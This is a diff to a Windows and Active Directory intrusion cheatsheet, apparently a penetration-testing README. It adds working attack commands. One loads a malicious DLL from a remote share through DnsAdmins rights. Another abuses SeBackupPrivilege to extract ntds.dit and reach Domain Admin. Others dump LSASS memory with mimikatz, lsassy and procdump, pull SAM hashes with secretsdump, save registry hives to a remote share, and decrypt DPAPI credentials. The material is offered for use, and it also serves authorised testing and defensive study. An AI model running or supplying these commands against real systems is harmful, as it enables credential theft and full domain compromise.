@@ -53,10 +53,11 @@ A cheatsheet in order to help during intrusion steps on Windows environment.
 - [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1)
 - [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
 - [Powermad](https://github.com/Kevin-Robertson/Powermad)
+- [Weirdhta](https://github.com/felamos/weirdhta)
 - [Powercat](https://github.com/besimorhino/powercat)
 - [Mimikatz](https://github.com/gentilkiwi/mimikatz)
 - [Lsassy](https://github.com/Hackndo/lsassy)
-- [Rubeus](https://github.com/GhostPack/Rubeus)
+- [Rubeus](https://github.com/GhostPack/Rubeus) -> [Compiled Version](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
 - [Bloodhound](https://github.com/BloodHoundAD/BloodHound)
 - [Ldeep](https://github.com/franc-pentest/ldeep)
 - [Ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
@@ -110,7 +111,7 @@ Rubeus.exe asreproast /domain:<domain_name> /format:<hashcat|john> /outfile:<fil
 # For a single user
 Rubeus.exe asreproast /user:<user> /domain:<domain_name> /format:<hashcat|john> /outfile:<filename>
 
-#For a spesific Organization Unit (OU)
+# For a spesific Organization Unit (OU)
 Rubeus.exe asreproast /ou:<OU_name> /domain:<domain_name> /format:<hashcat|john> /outfile:<filename>
 ```
 
@@ -320,32 +321,119 @@ Like PrintSpoofer, the token `SeImpersonatePrivilege` is abused to escalate priv
 CLSID can be obtain here: [CLSID](http://ohpe.it/juicy-potato/CLSID/).
 
 #### DNS Admin Abuse
-TODO
+If a user is a member of the DNSAdmins group, he can possibly load an arbitary DLL with the privileges of dns.exe that runs as SYSTEM. In case the DC serves a DNS, the user can escalate his privileges to DA. This exploitation process needs privileges to restart the DNS service to work.
+
+```
+# Get members of the DNSAdmins group
+net localgroup "DNSAdmins" /domain
+# Load a malicious dll from a member of DNSAdmins context
+# Stop service
+sc.exe \\<DNS_SERVER> stop dns
+# Replace the dll
+dnscmd.exe /config /serverlevelplugindll \\10.10.10.150\share\evil.dll
+# Restart the service
+sc.exe \\<DNS_SERVER> start dns
+```
 
 #### Backup Operator Abuse
-TODO
+If we manage to compromise a user account that is member of the Backup Operators group, we can then abuse it's `SeBackupPrivilege` to create a shadow copy of the current state of the DC, extract the ntds.dit database file, dump the hashes and escalate our privileges to DA.
+
+1) Once we have access on an account that has the SeBackupPrivilege we can access the DC and create a shadow copy using the signed binary diskshadow:
+```
+# Create a .txt file that will contain the shadow copy process script
+Script ->{
+set metadata c:\<PathToSave>metadata.cab
+set context clientaccessible
+set context persistent
+begin backup
+add volume c: alias mydrive
+create
+expose %mydrive% w:
+}
+```
+2) Next we need to access the shadow copy, we may have the `SeBackupPrivilege` but we cant just 
+simply copy-paste ntds.dit, we need to mimic a backup software and use Win32 API calls to copy it on an accessible folder. For this we can use [this](https://github.com/giuliano108/SeBackupPrivilege) repo:
+```
+# Importing both dlls from the repo using powershell
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+Import-Module .\SeBackupPrivilegeUtils.dll
+  
+# Checking if the SeBackupPrivilege is enabled
+Get-SeBackupPrivilege
+  
+# If it isn't we enable it
+Set-SeBackupPrivilege
+  
+# Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice
+Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\<PathToSave>\ntds.dit -Overwrite
+  
+# Dump the SYSTEM hive
+reg save HKLM\SYSTEM c:\temp\system.hive 
+```
+3) Using smbclient.py from impacket or some other tool we copy ntds.dit and the SYSTEM hive on our local machine.
+4) Use secretsdump.py from impacket and dump the hashes.
+5) Use psexec or another tool of your choice to PTH and get Domain Admin access.
 
 #### Exchange Abuse
-TODO
+- [Abusing Exchange one Api call from DA](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
+- [CVE-2020-0688](https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)
+- [PrivExchange](https://github.com/dirkjanm/PrivExchange) Exchange your privileges for Domain Admin privs by abusing Exchange
 
 ### Credential Harvesting
 
 #### LSASS
 
 ##### Mimikatz
+```
+# On the machine (AV might block it)
+.\mimikatz.exe "sekurlsa::logonPasswords full" exit
 
+# Locally from a minidump
+.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" exit
+```
 ##### Lsassy
-
+```
+lsassy -d <domain_name> -u <user> -p <password> -r -vv 10.10.10.10
+lsassy -d <domain_name> -u <user> -p <password> -dc-ip 10.10.10.10 -r --procdump /path/to/procdump -vv 10.10.10.0/24
+```
 ##### Procdump
+```
+.\procdump64.exe -accepteula -ma lsass.exe lsass
+.\procdump64.exe -accepteula -ma <lsass_pid> lsass
+```
 
 #### SAM
 
 ##### Impacket
+```
+secretsdump.py <domain_name>/<user>:<password>@10.10.10.10
+secretsdump.py <domain_name>/<user>@10.10.10.10 -hashes :<nt_hash>
+
+# Locally
+# Dump SYSTEM, SAM hives
+reg save HKLM\SYSTEM \\10.10.10.150\share\SYSTEM
+reg save HKLM\SYSTEM  \\10.10.10.150\share\SAM
+secretsdump.py -sam SAM -system SYSTEM local
+```
 
 #### DPAPI
 
 ##### Mimikatz
+From [mimikatz github](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)
+```
+# Check the details of the credential
+.\mimikatz.exe "dpapi::cred /in:C:\Users\victim\AppData\Local\Microsoft\Credentials\12345678901234567890123456789012" exit
 
+# Get victim security context (inject into user process or impersonnate with token)
+# Decrypt the Masterkey using her password: Tip: if we are on a user's context using /rpc will auth with DC and will decrypt the masterkey!
+.\mimikatz.exe "dpapi::masterkey /in:c:\Users\victim\AppData\Roaming\Microsoft\Protect\S-1-5-21-1313131313-8888888888-9999999999-1111\5f4b97cd-43aa-5e0f-26ab-fe63d801bbc4 /rpc" exit
+
+Results: Masterkey:abcdef0123[...]4567890
+SHA1 of masterkey:6b82b138e1a6b77f4c55a8df728288f56a3b6d5f
+
+# Decrypt the credential
+.\mimikatz.exe "token::elevate dpapi::cred /in:C:\Users\victim\AppData\Local\Microsoft\Credentials\12345678901234567890123456789012 /masterkey:6b82b138e1a6b77f4c55a8df728288f56a3b6d5f" exit
+```
 ### Lateral Movement
 
 #### CrackMapExec
